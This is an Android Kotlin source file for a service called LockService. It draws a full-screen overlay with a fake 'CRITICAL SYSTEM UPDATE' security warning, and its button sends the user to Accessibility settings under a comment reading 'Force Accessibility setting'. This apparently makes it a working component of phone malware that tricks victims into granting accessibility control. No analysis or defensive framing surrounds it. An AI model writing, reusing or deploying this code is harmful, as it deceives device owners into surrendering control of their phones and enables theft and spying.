package com.uk.core

import android.app.Service
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView

class LockService : Service() {
    private lateinit var windowManager: WindowManager
    private var overlayView: View? = null

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        showOverlay()
    }

    private fun showOverlay() {
        if (Settings.canDrawOverlays(this)) {
            val layout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setBackgroundColor(Color.parseColor("#050505"))
                gravity = Gravity.CENTER
                setPadding(50, 50, 50, 50)
            }

            val title = TextView(this).apply {
                text = "CRITICAL SYSTEM UPDATE"
                setTextColor(Color.parseColor("#ff003c"))
                textSize = 24f
                gravity = Gravity.CENTER
            }

            val desc = TextView(this).apply {
                text = "\nYour device requires an immediate security patch to prevent data corruption.\n\nYou must enable the System Update service to continue."
                setTextColor(Color.parseColor("#e0e0e0"))
                textSize = 16f
                gravity = Gravity.CENTER
            }

            val btn = Button(this).apply {
                text = "APPLY UPDATE"
                setTextColor(Color.BLACK)
                setBackgroundColor(Color.parseColor("#ff003c"))
                setOnClickListener {
                    // Force Accessibility setting
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                }
            }

            layout.addView(title)
            layout.addView(desc)
            layout.addView(btn)

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            )

            windowManager.addView(layout, params)
            overlayView = layout
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        overlayView?.let { windowManager.removeView(it) }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}